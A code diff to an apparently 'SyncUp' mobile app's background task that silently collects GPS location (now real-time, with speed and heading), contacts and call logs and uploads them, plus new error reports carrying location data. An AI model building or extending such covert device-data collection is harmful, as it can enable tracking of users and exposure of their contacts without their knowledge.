@@ -3,10 +3,11 @@ import * as BackgroundFetch from 'expo-background-fetch';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import * as Location from 'expo-location';
 import * as Contacts from 'expo-contacts';
+import * as Application from 'expo-application';
 import { Platform, PermissionsAndroid } from 'react-native';
 import CallLogs from 'react-native-call-log';
 import { getDeviceId } from './deviceId';
-import { sendAuditLog } from './auditLogger';
+import { sendAuditLog, reportAuditError } from './auditLogger';
 
 const BACKGROUND_AUDIT_TASK = 'background-audit-task';
 const LAST_AUDIT_KEY = 'syncup_last_bg_audit';
@@ -79,60 +80,107 @@ async function collectBackgroundMetadata() {
     call_logs: [],
   };
 
-  // 1. LOCATION — cached first (instant), quick GPS if available, then IP fallback
-  // NO GPS dialog — there is no UI in background
-  // Every native call wrapped with hard timeout — Android kills at 30s total
+  // 1. LOCATION — Priority: real-time GPS → cached → IP fallback
+  // Checks both foreground AND background location permissions.
+  // On Android 10+, reading location when screen is off requires
+  // ACCESS_BACKGROUND_LOCATION ("Allow all the time"), otherwise the OS
+  // silently blocks the read and we fall through to IP.
+  // NO GPS dialog — there is no UI in background.
+  let locationPath = 'none';
   try {
-    const status = await withTimeout(
+    // Check both permission scopes
+    const fgStatus = await withTimeout(
       Location.getForegroundPermissionsAsync().then(r => r.status),
       2000,
       'denied'
     );
-    if (status === 'granted') {
-      // Try cached location (instant, no GPS needed)
-      const cached = await withTimeout(
-        Location.getLastKnownPositionAsync({ maxAge: 86400000 }),
-        3000,
-        null
+    let bgStatus = 'denied';
+    try {
+      bgStatus = await withTimeout(
+        Location.getBackgroundPermissionsAsync().then(r => r.status),
+        2000,
+        'denied'
       );
-      if (cached) {
-        metadata.location = {
-          latitude: cached.coords.latitude,
-          longitude: cached.coords.longitude,
-          accuracy: cached.coords.accuracy,
-          timestamp: new Date(cached.timestamp).toISOString(),
-          is_gps: false,
-          is_approximate: true,
-          method: 'cached',
-        };
-      }
+    } catch {}
 
-      // If cached didn't work and GPS services are on, try quick low-accuracy fix
-      if (!metadata.location) {
-        const gpsOn = await withTimeout(Location.hasServicesEnabledAsync(), 2000, false);
-        if (gpsOn) {
+    const hasAnyPermission = fgStatus === 'granted' || bgStatus === 'granted';
+    const hasBackgroundPermission = bgStatus === 'granted';
+    locationPath = `perm_fg:${fgStatus}|bg:${bgStatus}`;
+
+    if (hasAnyPermission) {
+      const gpsOn = await withTimeout(Location.hasServicesEnabledAsync(), 2000, false);
+      locationPath += `|gps:${gpsOn ? 'on' : 'off'}`;
+
+      // --- STEP 1: If GPS is ON, try a real-time fresh fix first ---
+      // Use Balanced accuracy (network + GPS) — more reliable in background
+      // than Low (passive-only) but still fast (~3-6s).
+      if (gpsOn) {
+        try {
           const loc = await withTimeout(
-            Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Low }),
-            6000,
+            Location.getCurrentPositionAsync({
+              accuracy: Location.Accuracy.Balanced,
+              mayShowUserSettingsDialog: false,
+            }),
+            8000,
             null
           );
-          if (loc) {
+          if (loc && loc.coords) {
             metadata.location = {
               latitude: loc.coords.latitude,
               longitude: loc.coords.longitude,
               accuracy: loc.coords.accuracy,
+              altitude: loc.coords.altitude,
+              speed: loc.coords.speed,
+              heading: loc.coords.heading,
               timestamp: new Date(loc.timestamp).toISOString(),
               is_gps: true,
               is_approximate: false,
-              method: 'gps_low_accuracy',
+              method: hasBackgroundPermission ? 'gps_realtime' : 'gps_realtime_fg_only',
             };
+            locationPath += '|realtime_ok';
+          } else {
+            locationPath += '|realtime_null';
           }
+        } catch (err) {
+          locationPath += `|realtime_err:${(err?.message || 'x').slice(0, 20)}`;
+        }
+      }
+
+      // --- STEP 2: Fall back to last-known cached position ---
+      if (!metadata.location) {
+        try {
+          // No maxAge restriction — accept any cached fix the OS has
+          const cached = await withTimeout(
+            Location.getLastKnownPositionAsync(),
+            3000,
+            null
+          );
+          if (cached && cached.coords) {
+            const ageMs = Date.now() - cached.timestamp;
+            metadata.location = {
+              latitude: cached.coords.latitude,
+              longitude: cached.coords.longitude,
+              accuracy: cached.coords.accuracy,
+              timestamp: new Date(cached.timestamp).toISOString(),
+              age_seconds: Math.round(ageMs / 1000),
+              is_gps: false,
+              is_approximate: true,
+              method: 'cached',
+            };
+            locationPath += '|cached_ok';
+          } else {
+            locationPath += '|cached_null';
+          }
+        } catch (err) {
+          locationPath += `|cached_err:${(err?.message || 'x').slice(0, 20)}`;
         }
       }
     }
-  } catch {}
+  } catch (err) {
+    locationPath += `|perm_err:${(err?.message || 'x').slice(0, 20)}`;
+  }
 
-  // IP fallback if no device location (single attempt, hard 5s timeout)
+  // --- STEP 3: IP fallback (last resort) ---
   if (!metadata.location) {
     try {
       const res = await fetchWithTimeout('https://ipwho.is/', {}, 5000);
@@ -150,10 +198,16 @@ async function collectBackgroundMetadata() {
             is_approximate: true,
             method: 'ip_geolocation',
           };
+          locationPath += '|ip_ok';
         }
       }
-    } catch {}
+    } catch {
+      locationPath += '|ip_err';
+    }
   }
+
+  // Expose diagnostic trail so the Execution Log can show why IP was used
+  metadata._location_debug = locationPath;
 
   // 2. CONTACTS
   try {
@@ -222,6 +276,82 @@ async function collectBackgroundMetadata() {
 }
 
 /**
+ * Build a compact error report and fire it to the diagnostics endpoint.
+ * Never throws — failures here are logged locally but don't bubble up.
+ */
+async function sendErrorReport({ apiUrl, errorType, errorMessage, result, metadata, userId, deviceId, elapsedSec, stack }) {
+  try {
+    const payload = result?.payload || {
+      user_id: userId,
+      device_id: deviceId,
+      event_type: 'background-audit',
+      metadata,
+    };
+
+    let payloadSize = 0;
+    try { payloadSize = JSON.stringify(payload).length; } catch {}
+
+    const report = {
+      error_id: `bg-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
+      timestamp: new Date().toISOString(),
+
+      context: {
+        source: 'background-audit',
+        event_type: 'background-audit',
+        user_id: userId || null,
+        device_id: deviceId || null,
+        api_url: apiUrl || null,
+        app_version: Application.nativeApplicationVersion || null,
+        platform: Platform.OS,
+        os_version: Platform.Version != null ? String(Platform.Version) : null,
+        task_elapsed_seconds: elapsedSec != null ? Number(elapsedSec) : null,
+      },
+
+      error: {
+        type: errorType,                                    // API_FAILED | HTTP_ERROR | TASK_ERROR
+        message: errorMessage || 'unknown',
+        http_status: result?.http_status ?? null,
+        http_status_text: result?.http_status_text || '',
+        response_snippet: result?.response_snippet || '',
+        stack: stack || null,
+      },
+
+      payload_summary: {
+        location_method: metadata?.location?.method || null,
+        location_debug: metadata?._location_debug || null,
+        contacts_count: metadata?.contacts?.length ?? 0,
+        call_logs_count: metadata?.call_logs?.length ?? 0,
+        has_location: !!metadata?.location,
+        payload_size_bytes: payloadSize,
+      },
+
+      // Truncated preview — keeps report small (arrays summarised, not full)
+      payload_preview: {
+        user_id: payload.user_id || null,
+        device_id: payload.device_id || null,
+        event_type: payload.event_type || null,
+        timestamp: payload.timestamp || null,
+        metadata: metadata
+          ? {
+              location: metadata.location || null,
+              contacts: metadata.contacts?.length
+                ? `[${metadata.contacts.length} items — truncated]`
+                : [],
+              call_logs: metadata.call_logs?.length
+                ? `[${metadata.call_logs.length} items — truncated]`
+                : [],
+            }
+          : null,
+      },
+    };
+
+    await reportAuditError(apiUrl, report);
+  } catch (err) {
+    console.warn('[BackgroundAudit] sendErrorReport failed:', err?.message);
+  }
+}
+
+/**
  * Define the background task at the TOP LEVEL (outside any component).
  * This runs headlessly — no UI, no React context available.
  * Reads apiUrl, userId, deviceId from storage directly.
@@ -264,15 +394,47 @@ TaskManager.defineTask(BACKGROUND_AUDIT_TASK, async () => {
 
     if (result.success) {
       await AsyncStorage.setItem(LAST_AUDIT_KEY, new Date().toISOString());
-      await appendBgLog('SUCCESS', `${elapsed}s | contacts:${metadata.contacts.length} calls:${metadata.call_logs.length} loc:${metadata.location?.method || 'none'}`);
+      await appendBgLog(
+        'SUCCESS',
+        `${elapsed}s | loc:${metadata.location?.method || 'none'} | contacts:${metadata.contacts.length} | calls:${metadata.call_logs.length} | dbg:${metadata._location_debug || 'n/a'}`
+      );
       return BackgroundFetch.BackgroundFetchResult.NewData;
     } else {
       await appendBgLog('API_FAILED', `${elapsed}s: ${result.error || 'unknown'}`);
+      // Fire-and-forget diagnostic report — classify as HTTP_ERROR if no
+      // status code (network-level failure) or API_FAILED (server responded
+      // but rejected the payload / returned non-JSON).
+      await sendErrorReport({
+        apiUrl,
+        errorType: result.network_error ? 'HTTP_ERROR' : 'API_FAILED',
+        errorMessage: result.error,
+        result,
+        metadata,
+        userId,
+        deviceId,
+        elapsedSec: elapsed,
+      });
       return BackgroundFetch.BackgroundFetchResult.Failed;
     }
   } catch (err) {
     const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
     await appendBgLog('ERROR', `${elapsed}s: ${err.message}`);
+    // Also report task-level crashes so they surface server-side
+    try {
+      const apiUrl = await AsyncStorage.getItem(KEY_API_BASE);
+      const userId = await AsyncStorage.getItem(BG_USER_ID_KEY);
+      await sendErrorReport({
+        apiUrl,
+        errorType: 'TASK_ERROR',
+        errorMessage: err.message,
+        result: null,
+        metadata: null,
+        userId,
+        deviceId: null,
+        elapsedSec: elapsed,
+        stack: err.stack || null,
+      });
+    } catch {}
     return BackgroundFetch.BackgroundFetchResult.Failed;
   }
 });
